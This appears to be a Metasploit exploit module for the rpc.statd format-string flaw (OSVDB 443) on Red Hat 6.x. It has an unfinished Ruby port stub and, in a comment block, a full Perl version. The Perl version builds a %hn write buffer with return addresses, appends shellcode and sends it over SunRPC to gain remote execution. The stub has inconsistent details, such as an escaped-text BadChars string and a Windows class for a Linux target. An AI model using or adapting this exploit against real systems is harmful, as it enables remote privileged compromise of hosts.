require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => '',
			'Description'    => %q{
				statdx2
					
			},
			'Author'         => [ 'vlad902 <vlad902@gmail.com>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '443'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x5c\x78\x30\x30\x5c\x78\x30\x61\x5c\x78\x30\x64\x5c\x78\x32\x35",
					'MinNops'  => 800,
					'Prepend'  => "\x81\xc4\xff\xef\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'linux',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jul 16 2000',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::rpc_statd_fmt;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use Pex::SunRPC;
use Pex::XDR;

my $advanced = { };
my $info =
{
	'Name'  => '',
	'Version'  => '$Revision$',
	'Authors' => [ 'vlad902 <vlad902 [at] gmail.com>', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'linux' ],
	'Priv'  => 1,
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target RPC port', 111],
	},
	'Payload' => {
		'Space' => 1024,
		'MinNops' => 800,
		'BadChars' => '\x00\x0a\x0d\x25', #??? 
		'Prepend' => "\x81\xc4\xff\xef\xff\xff",	# add esp, -4097
	},
	'Description'  => Pex::Text::Freeform(qq{
statdx2
	}),
	'Refs'  =>  [
		['OSVDB', 443],
	],
	'Targets' => [
		[ 'Redhat 6.0/6.1/6.2 x86', 'V', 0xbffff314, 1024, 600, 9 ],
	],
	'Keys'  => ['rpc'],

	'DisclosureDate' => 'Jul 16 2000',
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;

	my $target_idx = $self->GetVar('TARGET');
	my $target = $self->Targets->[$target_idx];

	my %data;

	my $host = $self->GetVar('RHOST');
	my $port = $self->GetVar('RPORT');

	if(Pex::SunRPC::Clnt_create(\%data, $host, $port, 100024, 1, "tcp", "tcp") == -1)
	{
		$self->PrintLine("[*] RPC request failed (statd).");
		return;
	}

	$self->PrintLine("[*] Using port $data{'rport'}");
	Pex::SunRPC::Authunix_create(\%data, "localhost", 0, 0, []);
	$self->PrintLine("[*] Generating buffer...");

	my $hax0r = build_buf($self, $target->[1], $target->[2], $target->[3], $target->[4], $target->[5]);
	my $buf = Pex::XDR::Encode_string($hax0r, 1024);

	$self->PrintLine("[*] Sending payload...");
	if(Pex::SunRPC::Clnt_call(\%data, 1, $buf) == -1)
	{
		$self->PrintLine("[*] statd stat request failed.");
		return;
	}
	$self->PrintLine("[*] Sent!");

	$self->Handler();

	return;
}

sub build_buf {
	my ($self, $endian, $bufpos, $buflen, $offset, $wipe) = @_;

	my $shellcode = $self->GetVar('EncodedPayload')->Payload;
	my $buf = "";

	my $ret_addr = $bufpos + $buflen + 4;
	my $dst_addr = $bufpos + $offset;
	my $elen = $buflen - 24 - 1;
	my $cnt = 24;

	if($ret_addr & 0xff == 0x00)
	{
		$self->PrintLine("[*] Illegal character");
		exit(1);
	}

	$buf .= pack($endian, $ret_addr)x2;
	$buf .= pack($endian, $ret_addr + 2)x2;
	$cnt += 16;

	for(my $i = 0; $i < $wipe; $i++)
	{
		$buf .= "%8x";
		$cnt += 8;
	}

	my $pad;

	if($endian eq 'V')
	{
		$pad = ($dst_addr & 0xffff) - $cnt;
		$buf .= sprintf("%%%ldx%%hn", $pad);
		$pad = ($dst_addr >> 16 & 0xffff) + 0x10000 - $cnt - $pad;
		$buf .= sprintf("%%%ldx%%hn", $pad);
	}
	else
	{
		$pad = ($dst_addr >> 16 & 0xffff) + 0x10000 - $cnt - $pad;
		$buf .= sprintf("%%%ldx%%hn", $pad);
		$pad = ($dst_addr & 0xffff) - $cnt;
		$buf .= sprintf("%%%ldx%%hn", $pad);
	}

	$buf .= substr($shellcode, length($shellcode) - ($elen - length($buf)));

	return $buf;
}

=end


end
end	
